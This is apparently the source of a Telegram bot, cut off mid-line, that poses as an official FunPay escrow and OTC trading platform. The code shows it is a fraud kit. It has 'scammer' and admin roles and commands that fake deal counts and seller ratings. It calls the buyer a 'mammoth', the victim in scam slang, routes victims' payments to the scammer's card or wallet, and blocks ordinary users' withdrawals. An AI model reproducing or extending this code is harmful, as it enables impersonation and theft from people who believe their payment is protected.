import logging
import os
import sqlite3
import re
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext

from config import (
    ADMIN_IDS, SCAMMER_ID, SCAMMER_USERNAME,
    SUPPORT_USERNAME, COMMISSION, WELCOME_GIF_PATH,
    ERROR_MESSAGES,
    SCAMMER_STATS, SCAMMER_IDS,
    get_text,
    E_DEAL, E_GRAM, E_STARS, E_RUB, E_HAMMER, E_CHECK,
    E_CROSS, E_BACK, E_SHARE, E_CHART, E_LIST,
    E_USERS, E_SETTINGS, E_PAID, E_WARNING,
    E_PROFILE, E_WITHDRAW, E_CARD, E_GLOBE,
    E_CHAT, E_BANK, E_SUCCESS, E_GROUP,
    E_UP, E_DOWN, E_GIFT,
    E_RU, E_US, E_TR, E_AR, E_UA
)
from database import (
    init_db, add_user, get_user, add_requisite, get_requisites,
    delete_requisites, create_deal, get_deal, get_deal_by_partial,
    update_deal_buyer, update_deal_paid, update_deal_confirmed,
    update_deal_completed, get_user_deals, update_user_successful_deals,
    update_user_balance, get_all_users, get_all_deals,
    get_deal_count_by_status, get_user_count, DB_NAME,
    update_user_language
)
from keyboards import (
    main_menu, admin_panel, currency_selection, requisite_menu,
    deal_actions, deal_status_buttons, deal_paid_buttons,
    back_button, ok_button, share_deal, support_button, empty_keyboard,
    language_selection_menu
)
from states import DealStates, RequisiteStates

router = Router()
logger = logging.getLogger(__name__)

init_db()

def apply_scammer_stats():
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    for user_id_str, stats in SCAMMER_STATS.items():
        try:
            user_id = int(user_id_str)
            deals = stats.get("deals", 0)
            rating = stats.get("rating", 0.0)
            cur.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
            if cur.fetchone():
                cur.execute("UPDATE users SET successful_deals = ?, rating = ? WHERE user_id = ?", (deals, rating, user_id))
            else:
                cur.execute("INSERT INTO users (user_id, username, full_name, successful_deals, rating) VALUES (?, ?, ?, ?, ?)",
                            (user_id, f"scammer_{user_id}", "Scammer", deals, rating))
        except Exception as e:
            logger.error(f"Ошибка: {e}")
    conn.commit()
    conn.close()
    logger.info("✅ Статистика скамеров применена")

apply_scammer_stats()

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_scammer(user_id):
    return user_id in SCAMMER_IDS

def get_user_language(user_id):
    user = get_user(user_id)
    if user and len(user) > 7:
        return user[7] if user[7] else 'ru'
    return 'ru'

def validate_gram(address):
    return address.startswith('UQ') and len(address) >= 30

def validate_card(card):
    card = card.replace(' ', '').replace('-', '')
    return card.isdigit() and len(card) >= 16

def format_requisites(reqs):
    if not reqs:
        return "❌ Реквизиты не добавлены"
    lines = []
    for req_type, value in reqs:
        if req_type == "gram":
            lines.append(f"{E_GRAM} кошелёк:\n{value}")
        elif req_type == "card":
            lines.append(f"{E_CARD} карта:\n{value}")
        elif req_type == "stars":
            lines.append(f"{E_STARS} звёзды:\n{value}")
        elif req_type == "rub":
            lines.append(f"{E_RUB} рубли:\n{value}")
    return "\n\n".join(lines)

def format_amount(amount):
    if amount == int(amount):
        return str(int(amount))
    return str(amount)

def get_currency_emoji(currency):
    if currency == "грам":
        return "GRAMM"
    elif currency == "карта":
        return "₽"
    elif currency == "звезд":
        return E_GIFT
    return ""

async def send_main_menu(message: Message, user_id: int):
    lang = get_user_language(user_id)
    is_admin_user = is_admin(user_id)
    is_scammer_user = is_scammer(user_id)

    if is_admin_user:
        await message.answer(
            f"{E_SETTINGS} <b>{get_text(lang, 'admin_welcome')}</b>\n\n"
            f"<b>{get_text(lang, 'admin_commands')}</b>\n"
            f"/buy *{get_text(lang, 'buy_command')}*\n"
            f"/set_sdel – {get_text(lang, 'set_sdel')}\n"
            f"/set_ret – {get_text(lang, 'set_ret')}\n"
            f"/twodeal *{get_text(lang, 'twodeal')}*\n"
            f"/send *{get_text(lang, 'send_command')}*\n"
            f"/chat *{get_text(lang, 'chat_command')}*\n"
            f"/apply_stats – {get_text(lang, 'apply_stats')}"
        )

    if is_scammer_user and not is_admin_user:
        await message.answer(
            f"{E_SETTINGS} <b>{get_text(lang, 'scammer_welcome')}</b>\n\n"
            f"<b>{get_text(lang, 'scammer_commands')}</b>\n"
            f"/buy *{get_text(lang, 'buy_command')}*\n"
            f"/profile – {get_text(lang, 'profile_command')}\n"
            f"/balance – {get_text(lang, 'balance_command')}\n"
            f"/withdraw – {get_text(lang, 'withdraw_command')}"
        )

    if os.path.exists(WELCOME_GIF_PATH):
        try:
            gif = FSInputFile(WELCOME_GIF_PATH)
            await message.answer_animation(
                animation=gif,
                caption=f"{E_BANK} <b>FunPay · Официальная OTC-платформа</b>\n\n"
                        f"{E_CHECK} <b>{get_text(lang, 'main_menu')}</b>\n"
                        f"для безопасного обмена цифровыми активами.\n\n"
                        f"{E_CHECK} <b>{get_text(lang, 'main_menu')}</b>\n"
                        f"• Средства блокируются в блокчейне — прозрачно и безопасно\n"
                        f"• Автоматическая проверка оплаты и передачи товара\n"
                        f"• Система рейтинга покупателей и продавцов\n"
                        f"• Поддержка 24/7\n\n"
                        f"{E_CHAT} <b>{get_text(lang, 'support')}:</b> {SUPPORT_USERNAME}",
                reply_markup=main_menu(is_admin_user)
            )
            return
        except Exception as e:
            logger.error(f"GIF error: {e}")

    text = f"{E_BANK} <b>FunPay · Официальная OTC-платформа</b>\n\n"
    text += f"{E_CHECK} <b>{get_text(lang, 'main_menu')}</b>\n"
    text += f"для безопасного обмена цифровыми активами.\n\n"
    text += f"{E_CHECK} <b>{get_text(lang, 'main_menu')}</b>\n"
    text += f"• Средства блокируются в блокчейне — прозрачно и безопасно\n"
    text += f"• Автоматическая проверка оплаты и передачи товара\n"
    text += f"• Система рейтинга покупателей и продавцов\n"
    text += f"• Поддержка 24/7\n\n"
    text += f"{E_CHAT} <b>{get_text(lang, 'support')}:</b> {SUPPORT_USERNAME}"

    await message.answer(text, reply_markup=main_menu(is_admin_user))

@router.message(Command("apply_stats"))
async def cmd_apply_stats(message: Message):
    if not is_admin(message.from_user.id):
        lang = get_user_language(message.from_user.id)
        await message.answer(get_text(lang, "access_denied"))
        return
    apply_scammer_stats()
    lang = get_user_language(message.from_user.id)
    await message.answer(get_text(lang, "stats_applied"))

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()

    user_id = message.from_user.id
    username = message.from_user.username or "Нет юзернейма"
    full_name = message.from_user.full_name

    user = get_user(user_id)

    if not user:
        add_user(user_id, username, full_name, 'ru')
        await message.answer(
            f"{E_GLOBE} <b>{get_text('ru', 'language_title')}</b>",
            reply_markup=language_selection_menu()
        )
        return

    lang = get_user_language(user_id)

    args = message.text.split()
    if len(args) > 1:
        param = args[1].strip()
        if not param.startswith("ref_"):
            deal_code = param
            deal = get_deal(deal_code)
            if deal and deal[6] not in ['paid', 'confirmed', 'completed']:
                update_deal_buyer(deal_code, user_id)
                deal = get_deal(deal_code)
                currency_emoji = get_currency_emoji(deal[5])

                if deal[5] == "звезд":
                    await message.answer(
                        f"{E_DEAL} <b>{get_text(lang, 'deal_code')}:</b> #{deal_code}\n"
                        f"<b>{get_text(lang, 'amount')}:</b> {format_amount(deal[4])} {currency_emoji}\n"
                        f"<b>{get_text(lang, 'description')}:</b> {deal[5]}\n"
                        f"<b>{get_text(lang, 'commission')}:</b> {COMMISSION}%\n\n"
                        f"{E_CHAT} <b>{get_text(lang, 'stars_payment', scammer=SCAMMER_USERNAME)}</b>",
                        reply_markup=support_button()
                    )
                else:
                    reqs = get_requisites(deal[1])
                    req_text = format_requisites(reqs)
                    await message.answer(
                        f"{E_DEAL} <b>{get_text(lang, 'deal_code')}:</b> #{deal_code}\n"
                        f"<b>{get_text(lang, 'amount')}:</b> {format_amount(deal[4])} {currency_emoji}\n"
                        f"<b>{get_text(lang, 'description')}:</b> {deal[5]}\n"
                        f"<b>{get_text(lang, 'commission')}:</b> {COMMISSION}%\n\n"
                        f"<b>{get_text(lang, 'requisites_for_payment')}:</b>\n{req_text}\n\n"
                        f"{get_text(lang, 'after_payment')}",
                        reply_markup=support_button()
                    )

                buyer = get_user(user_id)
                buyer_deals = buyer[3] if buyer else 0
                buyer_rating = buyer[4] if buyer else 0.0

                seller = get_user(deal[1])
                seller_deals = seller[3] if seller else 0
                seller_rating = seller[4] if seller else 0.0

                await message.bot.send_message(
                    deal[1],
                    f"{E_WARNING} <b>@{username} ({user_id}) {get_text(lang, 'joined_deal')} #{deal_code}!</b>\n\n"
                    f"{E_PROFILE} <b>{get_text(lang, 'buyer_profile')}</b>\n"
                    f"⭐ <b>{get_text(lang, 'rating')}:</b> {buyer_rating}\n"
                    f"{E_SUCCESS} <b>{get_text(lang, 'successful_deals')}:</b> {buyer_deals}\n\n"
                    f"{E_PROFILE} <b>{get_text(lang, 'your_profile_seller')}</b>\n"
                    f"⭐ <b>{get_text(lang, 'rating')}:</b> {seller_rating}\n"
                    f"{E_SUCCESS} <b>{get_text(lang, 'successful_deals')}:</b> {seller_deals}\n\n"
                    f"{E_WARNING} <b>{get_text(lang, 'do_not_transfer', support=SUPPORT_USERNAME)}</b>"
                )
                return

    await send_main_menu(message, user_id)

@router.message(Command("buy"))
async def cmd_buy(message: Message):
    user_id = message.from_user.id
    lang = get_user_language(user_id)

    if not is_admin(user_id) and not is_scammer(user_id):
        await message.answer(get_text(lang, "access_denied"))
        return

    args = message.text.split()
    if len(args) < 2:
        await message.answer(f"{E_CROSS} <b>{get_text(lang, 'use_buy')}</b>")
        return

    deal_code = args[1].replace('#', '').strip()
    deal_code = re.sub(r'[^a-zA-Z0-9]', '', deal_code)
    
    logger.info(f"BUY: cleaned code='{deal_code}', len={len(deal_code)}")
    
    deal = get_deal_by_partial(deal_code)
    
    logger.info(f"BUY: deal found={deal is not None}")

    if not deal:
        await message.answer(f"{E_CROSS} <b>{get_text(lang, 'deal_not_found')}</b>")
        return

    if deal[6] != 'joined':
        await message.answer(f"{E_CROSS} <b>{get_text(lang, 'deal_not_joined')}</b>")
        return

    buyer_id = deal[3]
    buyer = get_user(buyer_id)
    buyer_username = buyer[1] if buyer else get_text(lang, "unknown")
    currency_emoji = get_currency_emoji(deal[5])

    await message.answer(
        f"{E_WARNING} <b>{get_text(lang, 'buy_confirm', code=deal[0])}</b>\n\n"
        f"<b>{get_text(lang, 'mammoth')}:</b> @{buyer_username} ({buyer_id})\n"
        f"<b>{get_text(lang, 'amount')}:</b> {format_amount(deal[4])} {currency_emoji}\n"
        f"<b>{get_text(lang, 'description')}:</b> {deal[5]}",
        reply_markup=deal_paid_buttons(deal[0])
    )

@router.message(Command("set_sdel"))
async def cmd_set_sdel(message: Message):
    user_id = message.from_user.id
    lang = get_user_language(user_id)

    if not is_admin(user_id):
        await message.answer(get_text(lang, "access_denied"))
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer(f"{E_CROSS} <b>{get_text(lang, 'set_sdel_usage')}</b>")
        return
    
    try:
        count = int(args[1])
    except:
        await message.answer(f"{E_CROSS} <b>{get_text(lang, 'count_must_be_number')}</b>")
        return
    
    target = user_id
    target_username = "себе"
    
    if len(args) > 2:
        target_arg = args[2]
        if target_arg.startswith('@'):
            target_arg = target_arg.replace('@', '')
            conn = sqlite3.connect(DB_NAME)
            cur = conn.cursor()
            cur.execute("SELECT user_id FROM users WHERE username = ?", (target_arg,))
            result = cur.fetchone()
            conn.close()
            if result:
                target = result[0]
                target_username = f"@{target_arg}"
            else:
                await message.answer(f"{E_CROSS} <b>{get_text(lang, 'user_not_found')}</b>")
                return
        else:
            try:
                target = int(target_arg)
                target_username = str(target)
            except:
                await message.answer(f"{E_CROSS} <b>{get_text(lang, 'invalid_format')}</b>")
                return
    
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute("UPDATE users SET successful_deals = ? WHERE user_id = ?", (count, target))
    conn.commit()
    conn.close()
    
    await message.answer(f"{E_SUCCESS} <b>{get_text(lang, 'set_for', count=count, target=target_username)}</b>")

@router.message(Command("set_ret"))
async def cmd_set_ret(message: Message):
    user_id = message.from_user.id
    lang = get_user_language(user_id)

    if not is_admin(user_id):
        await message.answer(get_text(lang, "access_denied"))
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer(f"{E_CROSS} <b>{get_text(lang, 'set_ret_usage')}</b>")
        return
    
    try:
        rating = float(args[1].replace(',', '.'))
        if rating < 0 or rating > 5:
            await message.answer(f"{E_CROSS} <b>{get_text(lang, 'rating_range')}</b>")
            return
    except:
        await message.answer(f"{E_CROSS} <b>{get_text(lang, 'rating_must_be_number')}</b>")
        return
    
    target = user_id
    target_username = "себе"
    
    if len(args) > 2:
        target_arg = args[2]
        if target_arg.startswith('@'):
            target_arg = target_arg.replace('@', '')
            conn = sqlite3.connect(DB_NAME)
            cur = conn.cursor()
            cur.execute("SELECT user_id FROM users WHERE username = ?", (target_arg,))
            result = cur.fetchone()
            conn.close()
            if result:
                target = result[0]
                target_username = f"@{target_arg}"
            else:
                await message.answer(f"{E_CROSS} <b>{get_text(lang, 'user_not_found')}</b>")
                return
        else:
            try:
                target = int(target_arg)
                target_username = str(target)
            except:
                await message.answer(f"{E_CROSS} <b>{get_text(lang, 'invalid_format')}</b>")
                return
    
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute("UPDATE users SET rating = ? WHERE user_id = ?", (rating, target))
    conn.commit()
    conn.close()
    
    await message.answer(f"{E_SUCCESS} <b>{get_text(lang, 'set_rating_for', rating=rating, target=target_username)}</b>")

@router.message(Command("twodeal"))
async def cmd_twodeal(message: Message):
    user_id = message.from_user.id
    lang = get_user_language(user_id)
    if not is_admin(user_id):
        await message.answer(get_text(lang, "access_denied"))
        return
    await message.answer(f"{E_SUCCESS} <b>{get_text(lang, 'function_in_development')}</b>")

@router.message(Command("send"))
async def cmd_send(message: Message):
    user_id = message.from_user.id
    lang = get_user_language(user_id)
    if not is_admin(user_id):
        await message.answer(get_text(lang, "access_denied"))
        return
    await message.answer(f"{E_SUCCESS} <b>{get_text(lang, 'function_in_development')}</b>")

@router.message(Command("chat"))
async def cmd_chat(message: Message):
    user_id = message.from_user.id
    lang = get_user_language(user_id)
    if not is_admin(user_id):
        await message.answer(get_text(lang, "access_denied"))
        return
    await message.answer(f"{E_SUCCESS} <b>{get_text(lang, 'function_in_development')}</b>")

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await send_main_menu(callback.message, callback.from_user.id)
    await callback.message.delete()
    await callback.answer()

@router.callback_query(F.data == "admin_panel")
async def admin_panel_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = get_user_language(user_id)

    if not is_admin(user_id):
        await callback.answer(get_text(lang, "access_denied"), show_alert=True)
        return

    if not callback.message.text:
        await callback.message.answer(
            f"{E_SETTINGS} <b>{get_text(lang, 'admin_panel')}</b>\n\n<b>{get_text(lang, 'admin_commands')}</b>",
            reply_markup=admin_panel()
        )
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(
        f"{E_SETTINGS} <b>{get_text(lang, 'admin_panel')}</b>\n\n<b>{get_text(lang, 'admin_commands')}</b>",
        reply_markup=admin_panel()
    )
    await callback.answer()

@router.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = get_user_language(user_id)

    if not is_admin(user_id):
        await callback.answer(get_text(lang, "access_denied"), show_alert=True)
        return

    user_count = get_user_count()
    deals = get_all_deals()
    stats = get_deal_count_by_status()

    text = f"{E_CHART} <b>{get_text(lang, 'stats')}</b>\n\n"
    text += f"{E_USERS} <b>{get_text(lang, 'total_users')}:</b> {user_count}\n"
    text += f"{E_LIST} <b>{get_text(lang, 'total_deals')}:</b> {len(deals)}\n\n"
    text += f"<b>{get_text(lang, 'statuses')}:</b>\n"
    for status, count in stats:
        emoji = {'created': '🟡', 'joined': '🔵', 'paid': '🟣', 'confirmed': '🟠', 'completed': E_SUCCESS}.get(status, '⚪')
        text += f"{emoji} {status}: {count}\n"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "admin_deals")
async def admin_deals(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = get_user_language(user_id)

    if not is_admin(user_id):
        await callback.answer(get_text(lang, "access_denied"), show_alert=True)
        return

    deals = get_all_deals()[:10]

    if not deals:
        text = f"{E_LIST} <b>{get_text(lang, 'no_deals')}</b>"
    else:
        text = f"{E_LIST} <b>{get_text(lang, 'last_10_deals')}:</b>\n\n"
        for deal in deals:
            currency_emoji = get_currency_emoji(deal[5])
            text += f"#{deal[0]} | {format_amount(deal[4])} {currency_emoji} | {deal[6]}\n"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "admin_users")
async def admin_users(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = get_user_language(user_id)

    if not is_admin(user_id):
        await callback.answer(get_text(lang, "access_denied"), show_alert=True)
        return

    users = get_all_users()[:10]

    if not users:
        text = f"{E_USERS} <b>{get_text(lang, 'no_users')}</b>"
    else:
        text = f"{E_USERS} <b>{get_text(lang, 'last_10_users')}:</b>\n\n"
        for user in users:
            text += f"@{user[1]} | <b>{get_text(lang, 'successful_deals')}:</b> {user[3]} | <b>{get_text(lang, 'rating')}:</b> {user[4]}\n"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = get_user_language(user_id)
    user = get_user(user_id)

    if not user:
        await callback.answer(get_text(lang, "user_not_found"), show_alert=True)
        return

    deals = get_user_deals(user_id)
    completed = [d for d in deals if d[6] == 'completed']

    text = f"{E_PROFILE} <b>{get_text(lang, 'profile_title')}</b>\n\n"
    text += f"🆔 <b>{get_text(lang, 'id')}:</b> {user[0]}\n"
    text += f"{E_PROFILE} <b>{get_text(lang, 'username')}:</b> @{user[1]}\n"
    text += f"📝 <b>{get_text(lang, 'name')}:</b> {user[2]}\n"
    text += f"{E_SUCCESS} <b>{get_text(lang, 'successful_deals')}:</b> {user[3]}\n"
    text += f"⭐ <b>{get_text(lang, 'rating')}:</b> {user[4]}\n"
    text += f"💰 <b>{get_text(lang, 'balance')}:</b> {user[5]} RUB\n"
    text += f"{E_LIST} <b>{get_text(lang, 'total_deals_count')}:</b> {len(deals)}\n"
    text += f"{E_SUCCESS} <b>{get_text(lang, 'completed_deals')}:</b> {len(completed)}"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "withdraw")
async def withdraw_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = get_user_language(user_id)
    user = get_user(user_id)
    balance = user[5] if user else 0

    if not is_admin(user_id) and not is_scammer(user_id):
        await callback.message.edit_text(
            f"{E_CROSS} <b>{get_text(lang, 'withdraw_title')}</b>\n\n"
            f"<b>{get_text(lang, 'min_withdraw')}</b>\n"
            f"<b>{get_text(lang, 'your_balance')}:</b> {balance} RUB\n\n"
            f"{E_CHAT} <b>{get_text(lang, 'support')}:</b> {SUPPORT_USERNAME}",
            reply_markup=support_button()
        )
        await callback.answer()
        return

    reqs = get_requisites(user_id)
    if not reqs:
        await callback.message.edit_text(
            f"{E_CROSS} <b>{get_text(lang, 'no_requisites_withdraw')}</b>",
            reply_markup=back_button()
        )
        await callback.answer()
        return

    text = f"{E_WITHDRAW} <b>{get_text(lang, 'withdraw_title')}</b>\n\n"
    text += f"<b>{get_text(lang, 'your_balance')}:</b> {balance} RUB\n"
    text += f"<b>{get_text(lang, 'your_requisites')}:</b>\n"
    for req_type, value in reqs:
        text += f"• {req_type.upper()}: {value}\n"
    text += f"\n{E_CHAT} <b>{get_text(lang, 'withdraw_request_sent')}</b>"

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "referrals")
async def referrals_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = get_user_language(user_id)
    bot_username = (await callback.bot.get_me()).username

    text = f"{E_GROUP} <b>{get_text(lang, 'referrals_title')}</b>\n\n"
    text += f"<b>{get_text(lang, 'referrals_text')}</b>\n"
    text += f"https://t.me/{bot_username}?start=ref_{user_id}\n\n"
    text += f"<b>{get_text(lang, 'referrals_bonus')}</b>"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "language")
async def language_callback(callback: CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    text = f"{E_GLOBE} <b>{get_text(lang, 'language_title')}</b>"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=language_selection_menu())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=language_selection_menu())
    await callback.answer()

@router.callback_query(F.data.startswith("lang_"))
async def language_selection(callback: CallbackQuery, state: FSMContext):
    lang = callback.data.replace("lang_", "")
    user_id = callback.from_user.id

    update_user_language(user_id, lang)

    await callback.message.delete()

    lang_name = {
        "ru": "Русский", 
        "en": "English", 
        "tr": "Türkçe", 
        "ar": "العربية",
        "ua": "Українська"
    }.get(lang, "Unknown")
    
    await callback.message.answer(f"✅ {get_text(lang, 'language_set')}")

    await send_main_menu(callback.message, user_id)
    await callback.answer()

@router.callback_query(F.data == "requisites")
async def requisites_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = get_user_language(user_id)
    reqs = get_requisites(user_id)

    text = f"{E_CARD} <b>{get_text(lang, 'requisites')}:</b>\n\n"
    if reqs:
        for i, (req_type, value) in enumerate(reqs, 1):
            text += f"{i}. {req_type.upper()}: {value}\n"
    else:
        text += f"{E_CROSS} <b>{get_text(lang, 'no_requisites')}</b>\n\n"

    text += f"\n{E_DEAL} <b>{get_text(lang, 'requisites')}:</b>"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=requisite_menu())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=requisite_menu())
    await callback.answer()

@router.callback_query(F.data == "add_gram")
async def add_gram_start(callback: CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if not callback.message.text:
        await callback.message.answer(
            f"{E_WARNING} <b>{get_text(lang, 'invalid_gram')}</b>",
            reply_markup=back_button()
        )
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(
        f"{E_WARNING} <b>{get_text(lang, 'invalid_gram')}</b>",
        reply_markup=back_button()
    )
    await state.set_state(RequisiteStates.waiting_gram)
    await callback.answer()

@router.message(RequisiteStates.waiting_gram)
async def process_gram(message: Message, state: FSMContext):
    user_id = message.from_user.id
    lang = get_user_language(user_id)
    address = message.text.strip()

    if not validate_gram(address):
        await message.answer(
            f"{E_WARNING} <b>{get_text(lang, 'invalid_gram')}</b>",
            reply_markup=back_button()
        )
        return

    add_requisite(user_id, "gram", address)
    await state.clear()
    await message.answer(
        f"{E_SUCCESS} <b>{get_text(lang, 'added_gram')}</b>",
        reply_markup=back_button()
    )

@router.callback_query(F.data == "add_card")
async def add_card_start(callback: CallbackQuery, state: FSMContext):
    lang = get_user_language(callback.from_user.id)
    if not callback.message.text:
        await callback.message.answer(
            f"{E_WARNING} <b>{get_text(lang, 'enter_card')}</b>",
            reply_markup=back_button()
        )
        await callback.message.delete()
        await